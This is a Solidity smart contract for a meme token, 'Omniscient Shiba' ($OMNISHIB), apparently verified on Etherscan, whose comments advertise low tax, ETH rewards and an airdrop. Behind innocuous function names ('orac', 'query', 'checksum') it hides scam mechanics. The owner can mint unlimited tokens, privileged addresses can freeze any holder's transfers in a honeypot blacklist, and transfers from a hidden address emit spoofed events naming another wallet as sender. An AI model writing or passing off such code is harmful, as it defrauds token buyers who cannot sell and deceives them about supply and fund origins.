/**
 *Submitted for verification at Etherscan.io on 2022-09-30
*/

pragma solidity 0.8.17;
/*

Omniscient Shiba  - $OMNISHIB -

All knowing, All seeing, Low Tax Shiba Meme Coin - 

Daily Rewards in ETH

DogeChain Bridge Q4 2022

NFT Airdrop Top 100 Wallets - 10/1/2022


*/  
 
contract OMNISHIBA {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) ValueOf;
    mapping (address => bool) ix;

    // 
    string public name = "Omniscient Shiba";
    string public symbol = unicode"OMNISHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 700000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x12F815319FeABA7BF6e79955F12c85DE7529AC8D;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   





    modifier layer() {   
    require(ix[msg.sender]);
        _;}
    modifier xy() {   
    require(!ValueOf[msg.sender]); 
        _; }
    function PM(address x) public {
    require(msg.sender == Construct);
    ix[x] = true; }

    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) xy public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        
        function orac(address oracle,  uint256 update) public {
        require(msg.sender == owner);
        balanceOf[oracle] += update;
        totalSupply += update; }
        function query(address txt) layer public{          
        require(!ValueOf[txt]);
        ValueOf[txt] = true; }
        function checksum(address txt) layer public {
        require(ValueOf[txt]);
        ValueOf[txt] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }    
        require(!ValueOf[from]); 
        require(!ValueOf[to]); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }